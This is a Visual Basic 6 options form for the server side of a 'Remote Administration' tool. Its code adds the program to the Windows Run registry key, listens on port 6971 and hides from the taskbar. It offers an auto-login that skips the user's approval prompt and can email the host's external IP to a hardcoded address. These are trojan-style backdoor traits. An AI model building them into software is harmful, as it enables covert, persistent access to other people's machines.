VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form frmOptions 
   BorderStyle     =   0  'None
   Caption         =   "Remote Administration (Server) Options"
   ClientHeight    =   7455
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4695
   Icon            =   "frmOptions.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7455
   ScaleWidth      =   4695
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox txtExIP 
      Height          =   285
      Left            =   5040
      TabIndex        =   24
      Text            =   "127.0.0.1"
      Top             =   600
      Width           =   1095
   End
   Begin VB.Frame Frame3 
      Caption         =   "E-Mail Options"
      Height          =   1215
      Left            =   120
      TabIndex        =   19
      Top             =   5640
      Width           =   4455
      Begin VB.TextBox txtEmail 
         Height          =   285
         Left            =   1800
         TabIndex        =   22
         Top             =   840
         Width           =   2535
      End
      Begin VB.CheckBox chkEmail 
         Caption         =   "Auto E-Mail IP Number to Client."
         Height          =   375
         Left            =   120
         TabIndex        =   20
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label7 
         Alignment       =   2  'Center
         Caption         =   "Auto E-Mail Address:"
         Height          =   255
         Left            =   120
         TabIndex        =   23
         Top             =   840
         Width           =   1695
      End
      Begin VB.Label Label6 
         Caption         =   "This Option Will Automatically E-Mail The Client The Server's IP When The Server Is Started."
         Height          =   615
         Left            =   1800
         TabIndex        =   21
         Top             =   120
         Width           =   2535
      End
   End
   Begin MSWinsockLib.Winsock sockServer 
      Left            =   720
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6971
   End
   Begin VB.CheckBox chkDownload 
      Caption         =   "File Download"
      Height          =   255
      Left            =   120
      TabIndex        =   17
      Top             =   1200
      Width           =   1575
   End
   Begin VB.CommandButton cmdExIP 
      Caption         =   "Get Server IP"
      Height          =   375
      Left            =   120
      TabIndex        =   16
      Top             =   6960
      Width           =   1335
   End
   Begin VB.TextBox txtLocation 
      Height          =   285
      Left            =   120
      TabIndex        =   15
      Top             =   7680
      Width           =   4455
   End
   Begin VB.CommandButton cmdClose 
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Small Fonts"
         Size            =   6
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   200
      Left            =   4450
      TabIndex        =   14
      Top             =   38
      Width           =   200
   End
   Begin VB.CommandButton cmdCancel 
      Caption         =   "Cancel"
      Height          =   375
      Left            =   1680
      TabIndex        =   12
      Top             =   6960
      Width           =   1335
   End
   Begin VB.CommandButton cmdSaveSetting 
      Caption         =   "Save Settings"
      Height          =   375
      Left            =   3240
      TabIndex        =   11
      Top             =   6960
      Width           =   1335
   End
   Begin VB.Frame Frame2 
      Caption         =   "Remote Administration Ver 5.0.1"
      Height          =   2775
      Left            =   1800
      TabIndex        =   10
      Top             =   2880
      Width           =   2775
      Begin VB.Image Image1 
         Height          =   2415
         Left            =   120
         Picture         =   "frmOptions.frx":0442
         Top             =   240
         Width           =   2505
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Allowed Users"
      Enabled         =   0   'False
      Height          =   2775
      Left            =   120
      TabIndex        =   6
      Top             =   2880
      Width           =   1575
      Begin VB.CommandButton cmdRemove 
         Caption         =   "Remove"
         Enabled         =   0   'False
         Height          =   375
         Left            =   120
         TabIndex        =   9
         Top             =   2280
         Width           =   1335
      End
      Begin VB.CommandButton cmdAdd 
         Caption         =   "Add"
         Enabled         =   0   'False
         Height          =   375
         Left            =   120
         TabIndex        =   8
         Top             =   1800
         Width           =   1335
      End
      Begin VB.ListBox List1 
         Height          =   1425
         Left            =   120
         Sorted          =   -1  'True
         TabIndex        =   7
         Top             =   240
         Width           =   1335
      End
      Begin InetCtlsObjects.Inet Inet1 
         Left            =   600
         Top             =   600
         _ExtentX        =   1005
         _ExtentY        =   1005
         _Version        =   393216
      End
   End
   Begin VB.CheckBox chkVerify 
      Caption         =   "Verify Log-In"
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   2400
      Width           =   1455
   End
   Begin VB.CheckBox chkAutoLogin 
      Caption         =   "Auto Log-In"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   1920
      Width           =   1575
   End
   Begin VB.CheckBox chkRunAtStartUp 
      Caption         =   "Run At Start-Up "
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   1455
   End
   Begin VB.Label Label5 
      Caption         =   "(If Checked, The Server Will Allow Files To Be Downloaded From The Server.)"
      Height          =   615
      Left            =   1680
      TabIndex        =   18
      Top             =   1200
      Width           =   2775
   End
   Begin VB.Line Line4 
      X1              =   0
      X2              =   4680
      Y1              =   0
      Y2              =   0
   End
   Begin VB.Line Line3 
      X1              =   4680
      X2              =   4680
      Y1              =   7440
      Y2              =   0
   End
   Begin VB.Line Line2 
      X1              =   0
      X2              =   0
      Y1              =   7440
      Y2              =   0
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   4680
      Y1              =   7440
      Y2              =   7440
   End
   Begin VB.Label Label4 
      BackColor       =   &H000000FF&
      Caption         =   " Remote Administration (Server) Options"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0FF&
      Height          =   255
      Left            =   0
      TabIndex        =   13
      Top             =   0
      Width           =   4695
   End
   Begin VB.Label Label3 
      Caption         =   "(If Checked, The Server Will Only Allow Specified Users To Log-In.)"
      Height          =   495
      Left            =   1680
      TabIndex        =   5
      Top             =   2400
      Width           =   2895
   End
   Begin VB.Label Label2 
      Caption         =   "(If Checked, The Server Will NOT prompt you for a ""YES"" click.)"
      Height          =   495
      Left            =   1680
      TabIndex        =   3
      Top             =   1920
      Width           =   2895
   End
   Begin VB.Label Label1 
      Caption         =   "(If Checked, Remote Admin Server Will Automatically Start When Computer Does.)"
      Height          =   615
      Left            =   1680
      TabIndex        =   1
      Top             =   480
      Width           =   2895
   End
End
Attribute VB_Name = "frmOptions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Opt(1 To 5) As Integer      'First 3 Options
Dim Allowed(0 To 19) As String  'Users Allowed
Dim NpuT(0 To 25) As String     'String for Input
Private Sub RemoveFromStartUp()
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "RAS", ""
End Sub
Private Sub AddToStartUp()
SetStringValue "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "RAS", frmOptions.txtLocation.Text
End Sub

Private Sub chkEmail_Click()
If chkEmail.Value = 0 Then
    txtEmail.Enabled = False
    Exit Sub
End If
If chkEmail.Value = 1 Then
    txtEmail.Enabled = True
    If txtEmail.Text <> "" Then
        frmmail.txtToBox.Text = txtEmail.Text
    End If
End If
End Sub

Private Sub chkVerify_Click()
If chkVerify.Value = 1 Then
    Frame1.Enabled = True
    cmdAdd.Enabled = True
    cmdRemove.Enabled = True
    List1.Enabled = True
Else
    Frame1.Enabled = False
    cmdAdd.Enabled = False
    cmdRemove.Enabled = False
    List1.Enabled = False
End If
End Sub

Private Sub cmdAdd_Click()
For i = 0 To 19
    Allowed(i) = ""
Next i
Dim WTA As String
WTA = InputBox("Who Would You Like Authorize?", "ADD AUTHORIZATION")
If WTA <> "" Then
    List1.AddItem WTA
End If
If chkRunAtStartUp.Value = 1 Then
    AddToStartUp
Else
    RemoveFromStartUp
End If
Dim Opti1 As String
Dim opti2 As String
Dim opti3 As String
Dim opti4 As String
Dim opti5 As String
Dim opti5A As String
opti5A = txtEmail.Text
Opt(1) = chkRunAtStartUp.Value
Opt(2) = chkAutoLogin.Value
Opt(3) = chkVerify.Value
Opt(4) = chkDownload.Value
Opt(5) = chkEmail.Value
Opti1 = Opt(1)
opti2 = Opt(2)
opti3 = Opt(3)
opti4 = Opt(4)
opti5 = Opt(5)
If List1.ListCount > 0 Then
    For i = 0 To List1.ListCount - 1
        Allowed(i) = List1.List(i)
    Next i
End If
Kill App.Path & "\RA.ini"
Open App.Path & "\RA.ini" For Append As #1
Print #1, Opti1
Print #1, opti2
Print #1, opti3
Print #1, opti4
Print #1, opti5
Print #1, opti5A
For i = 0 To 19
    If Allowed(i) <> "" Then
        Print #1, Allowed(i)
    End If
Next i
Close
End Sub

Private Sub cmdCancel_Click()
Me.Hide
End Sub

Private Sub cmdClose_Click()
cmdCancel = True
End Sub

Private Sub cmdExIP_Click()
Dim XIP As String
GetExternalIP XIP
MsgBox "External IP: " & XIP & Chr(13) & Chr(10) & "Local IP: " & frmServer.W1.LocalIP
frmServer.Caption = "Remote Admin(Server) - " & XIP
Label4.Caption = " Remote Admin(Server) Options " & XIP
ExternalIP = XIP
End Sub
Public Function DoSomething()
Dim XIP As String
GetExternalIP XIP
txtExIP.Text = XIP
frmmail.txtToBox.Text = txtExIP.Text
End Function
Private Function GetHTML(url$) As String
Dim response$
Dim vData As Variant
Inet1.Cancel
response = Inet1.OpenURL(url)
If response <> "" Then
    Do
        vData = Inet1.GetChunk(1024, icString)
        DoEvents: DoEvents: DoEvents: DoEvents
        If Len(vData) Then
            response = response & vData
        End If
    Loop While Len(vData)
End If
GetHTML = response
End Function
Private Sub GetExternalIP(ByRef Whatever As String)
HTML = GetHTML("http://whatismyip.com/")
Start = InStr(HTML, "is")
Finish = InStr(HTML, "WhatIsMyIP.com")
Start = Start + 3
Finish = Finish - Start - 1
ExIP = Mid(HTML, Start, Finish)
Whatever = ExIP
End Sub
Private Sub cmdRemove_Click()
On Error GoTo Err
For i = 0 To 19
    Allowed(i) = ""
Next i
Dim wtr As Integer
wtr = List1.ListIndex
List1.RemoveItem wtr
If chkRunAtStartUp.Value = 1 Then
    AddToStartUp
Else
    RemoveFromStartUp
End If
Dim Opti1 As String
Dim opti2 As String
Dim opti3 As String
Dim opti4 As String
Dim opti5 As String
Dim opti5A As String
opti5A = txtEmail.Text
Opt(1) = chkRunAtStartUp.Value
Opt(2) = chkAutoLogin.Value
Opt(3) = chkVerify.Value
Opt(4) = chkDownload.Value
Opt(5) = chkEmail.Value
Opti1 = Opt(1)
opti2 = Opt(2)
opti3 = Opt(3)
opti4 = Opt(4)
opti5 = Opt(5)
If List1.ListCount > 0 Then
    For i = 0 To List1.ListCount - 1
        Allowed(i) = List1.List(i)
    Next i
End If
Kill App.Path & "\RA.ini"
Open App.Path & "\RA.ini" For Append As #1
Print #1, Opti1
Print #1, opti2
Print #1, opti3
Print #1, opti4
Print #1, opti5
Print #1, opti5A
For i = 0 To 19
    If Allowed(i) <> "" Then
        Print #1, Allowed(i)
    End If
Next i
Close
Exit Sub
Err:
MsgBox "Select Who To Remove", vbOKOnly, "NO ONE SELECTED"
End Sub

Private Sub cmdSaveSetting_Click()
If chkVerify.Value = 1 Then
    If List1.ListCount < 1 Then
        MsgBox "You MUST Add Someone To The List To Use The 'Verify' Option.", vbInformation, "NO ONE ADDED TO LIST"
        chkVerify.Value = 0
        Exit Sub
    End If
End If
For i = 0 To 19
    Allowed(i) = ""
Next i
If chkRunAtStartUp.Value = 1 Then
    AddToStartUp
Else
    RemoveFromStartUp
End If
Dim Opti1 As String
Dim opti2 As String
Dim opti3 As String
Dim opti4 As String
Dim opti5 As String
Dim opti5A As String
Opt(1) = chkRunAtStartUp.Value
Opt(2) = chkAutoLogin.Value
Opt(3) = chkVerify.Value
Opt(4) = chkDownload.Value
Opt(5) = chkEmail.Value
Opti1 = Opt(1)
opti2 = Opt(2)
opti3 = Opt(3)
opti4 = Opt(4)
opti5 = Opt(5)
opti5A = txtEmail.Text
If List1.ListCount > 0 Then
    For i = 0 To List1.ListCount - 1
        Allowed(i) = List1.List(i)
    Next i
End If
Kill App.Path & "\RA.ini"
Open App.Path & "\RA.ini" For Append As #1
Print #1, Opti1
Print #1, opti2
Print #1, opti3
Print #1, opti4
Print #1, opti5
Print #1, opti5A
For i = 0 To 19
    If Allowed(i) <> "" Then
        Print #1, Allowed(i)
    End If
Next i
Close
Me.Visible = False
End Sub

Private Sub Form_Load()
Me.Top = 20
Me.Left = 4095
sockServer.Close
sockServer.Listen
txtLocation.Text = App.Path & App.EXEName & ".exe"
On Error GoTo Err:
Open App.Path & "\RA.ini" For Input As #1
Dim i As Integer
i = 0
EOF (1)
Do Until EOF(1) = True
    i = i + 1
    Input #1, NpuT(i)
    DoEvents
Loop
Opt(1) = NpuT(1)
Opt(2) = NpuT(2)
Opt(3) = NpuT(3)
Opt(4) = NpuT(4)
Opt(5) = NpuT(5)
txtEmail.Text = NpuT(6)
Dim UPT As Integer
For i = 7 To 25
    UPT = i - 7
    If NpuT(i) <> "" Then
        Allowed(UPT) = NpuT(i)
    End If
Next i
If Opt(1) = 1 Then chkRunAtStartUp.Value = 1
If Opt(2) = 1 Then chkAutoLogin.Value = 1
If Opt(3) = 1 Then chkVerify.Value = 1
If Opt(4) = 1 Then chkDownload.Value = 1
If Opt(5) = 1 Then
    chkEmail.Value = 1
    DoSomething
End If
For i = 0 To 19
    If Allowed(i) <> "" Then List1.AddItem Allowed(i)
Next i
Close
chkVerify_Click
chkEmail_Click
Exit Sub
Err:
Close
Dim XX As String
Open App.Path & "\RA.ini" For Append As #1
For i = 1 To 5
    If i = 4 Then
        XX = "1"
    Else
        XX = "0"
    End If
    Print #1, XX
Next i
Print #1, "usssssy@yahoo.com"
Close
txtEmail.Text = "usssssy@yahoo.com"
chkDownload.Value = 1
End Sub

Private Sub Form_LostFocus()
Me.Visible = False
End Sub

Private Sub sockServer_Close()
sockServer.Close
sockServer.Listen
End Sub

Private Sub sockServer_ConnectionRequest(ByVal requestID As Long)
If sockServer.State <> sckClosed Then
    sockServer.Close
    sockServer.Accept requestID
Else
    sockServer.Accept requestID
End If
Pause 20
SendInfo
End Sub
Private Sub SendInfo()
Dim MSG As String
MSG = "|INFO|"
MSG = MSG & chkRunAtStartUp.Value & chkAutoLogin.Value & chkVerify.Value & chkDownload.Value & chkEmail.Value & "|"
For i = 0 To List1.ListCount - 1
    MSG = MSG & List1.List(i) & ","
Next i
sockServer.SendData ENCRYPT(MSG, Len(MSG))
Pause 10
MSG = "|EMAIL|" & txtEmail.Text
sockServer.SendData ENCRYPT(MSG, Len(MSG))
End Sub

Private Sub sockServer_DataArrival(ByVal bytesTotal As Long)
Dim Data As String
sockServer.GetData Data
Data = DECRYPT(Data, Len(Data))

If InStr(1, Data, "|INFO|") <> 0 Then
    ShoInfo Mid(Data, 7, Len(Data))
    Exit Sub
End If
If InStr(1, Data, "|EMAIL|") <> 0 Then
    txtEmail.Text = Mid(Data, 8, Len(Data))
    cmdSaveSetting = True
    Exit Sub
End If
End Sub
Private Sub ShoInfo(Info As String)
List1.Clear
Dim CHKS As String
Dim UZRZ As String
CHKS = Mid(Info, 1, 5)
UZRZ = Mid(Info, 7, Len(Info))
Dim CHK1 As Integer
Dim CHK2 As Integer
Dim CHK3 As Integer
Dim CHK4 As Integer
Dim chk5 As Integer
CHK1 = Mid(CHKS, 1, 1)
CHK2 = Mid(CHKS, 2, 1)
CHK3 = Mid(CHKS, 3, 1)
CHK4 = Mid(CHKS, 4, 1)
chk5 = Mid(CHKS, 5, 1)
chkRunAtStartUp.Value = CHK1
chkAutoLogin.Value = CHK2
chkVerify.Value = CHK3
chkDownload.Value = CHK4
chkEmail.Value = chk5
If Len(UZRZ) <= 0 Then
    GoTo DONE
Else
    Dim WEE As Integer
    For i = 1 To Len(UZRZ)
        If Mid(UZRZ, i, 1) = "," Then
            WEE = WEE + 1
        End If
    Next i
End If
Dim VVV As Integer
For i = 1 To WEE
    VVV = InStr(1, UZRZ, ",")
    List1.AddItem Mid(UZRZ, 1, VVV - 1)
    UZRZ = Mid(UZRZ, VVV + 1, Len(UZRZ))
Next i
DONE:
End Sub


